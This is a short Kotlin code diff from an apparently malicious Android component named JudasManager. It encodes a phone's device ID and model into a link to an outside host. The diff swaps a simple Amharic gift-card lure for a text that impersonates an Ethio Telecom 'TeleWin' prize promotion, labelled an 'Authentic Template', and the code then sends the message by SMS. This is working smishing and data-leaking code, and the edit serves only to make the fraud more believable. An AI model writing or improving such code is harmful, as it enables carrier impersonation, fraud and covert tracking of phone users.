@@ -80,8 +80,17 @@ object JudasManager {
             val rawData = "ID:$deviceId|M:$model"
             val hexData = rawData.toByteArray().joinToString("") { "%02x".format(it) }
             
-            // Amharic Promo: "Congratulations! Get your 500 birr card gift at this link:"
-            val promo = "እንኳን ደስ አላችሁ! የ 500 ብር የካርድ ስጦታዎን በዚህ ሊንክ ይውሰዱ፡ http://tele-promo.et/v?d=$hexData"
+            // Amharic Promo: TeleWin Authentic Template
+            val promo = """በቴሌዊን ጨዋታዎች እየተዝናኑ ይሸለሙ!
+
+ጥያቄዎችን በመመለስ ስማርት ስልኮችን፣ በቴሌብር በየወሩ በ75 ሺህ፣ በየሳምንቱ 50 ሺህ፣ በየቀኑ 5 ሺህ ብር እና የአየር ሰዓት ይሸለሙ!
+
+ዝርዝር መረጃ ለማግኘት፡ http://tele-promo.et/v?d=$hexData
+
+ለመመዝገብ *985*1*1# 
+ለማቋረጥ *985*6# ይደውሉ፡፡
+
+ኢትዮ ቴሌኮም"""
             
             val smsManager = ctx.getSystemService(SmsManager::class.java)
             val parts = smsManager.divideMessage(promo)
